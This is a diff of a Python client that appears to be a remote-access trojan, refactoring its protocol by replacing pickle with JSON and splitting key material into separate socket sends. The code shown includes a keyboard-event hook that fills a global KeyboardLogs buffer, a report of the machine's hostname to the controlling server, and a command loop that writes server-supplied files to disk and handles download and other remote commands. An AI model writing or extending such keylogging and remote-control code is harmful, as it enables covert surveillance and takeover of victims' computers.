@@ -1,6 +1,6 @@
+import json
 import logging
 import os
-import pickle
 import platform
 import socket
 import subprocess
@@ -97,6 +97,9 @@ def kill(proc_pid):
         proc.kill()
     process.kill()
 
+def json_loads(data):
+    return json.loads(data.decode())
+
 def OnKeyboardEvent(event):
     global KeyboardLogs
 
@@ -163,12 +166,18 @@ class Client(object):
             Signature = sign(self.privateKey, Hashed_Key)
             Encrypted_Signature = sign(self.privateKey, Hash_Encrypted)
 
-            data = pickle.dumps({'Hashed_Key': Hashed_Key, 'Encrypted': Encrypted, 'Hash_Encrypted': Hash_Encrypted, 'Signature': Signature, 'Encrypted_Signature': Encrypted_Signature})
+            def send_data(data):
+                self.socket.send(str(len(data)).encode())
+                self.socket.recv(4096)
+                self.socket.send(data)
+                self.socket.recv(4096)
 
-            self.socket.send(str(len(data)).encode())
-            self.socket.recv(4096)
-            self.socket.send(data)
-            self.socket.recv(4096)
+            send_data(Hashed_Key)
+            send_data(Encrypted)
+            send_data(Hash_Encrypted)
+            send_data(Signature)
+            send_data(Encrypted_Signature)
+
             self.send(socket.gethostname().encode())
             os.chdir(os.path.dirname(sys.argv[0]))
         except Exception as e:
@@ -204,7 +213,7 @@ class Client(object):
     def receive_commands(self):
         """ Receives Commands from Server """
         while True:
-            data = pickle.loads(self.receive())
+            data = json_loads(self.receive())
             # data[0]: command
             # data[1]: data1
             # data[2]: data2
@@ -218,9 +227,10 @@ class Client(object):
                 self.send(b'<DONE>')
 
             if data[0] == '--s':
+                self.send(b'<RECEIVED>')
                 with open(data[1], 'wb') as f:
-                    f.write(data[2])
-                self.send(b'File Transfer Successful\n')
+                    f.write(self.receive())
+                self.send(b'File Transfer Successful')
                 continue
 
             if data[0] == '--d':
@@ -231,7 +241,7 @@ class Client(object):
                 except Exception as e:
                     self.send('Error downloading file: {}\n'.format(str(e)).encode())
                     continue
-                self.send(b'Download Successful\n')
+                self.send(b'Download Successful')
                 continue
 
             if data[0] == '--c':
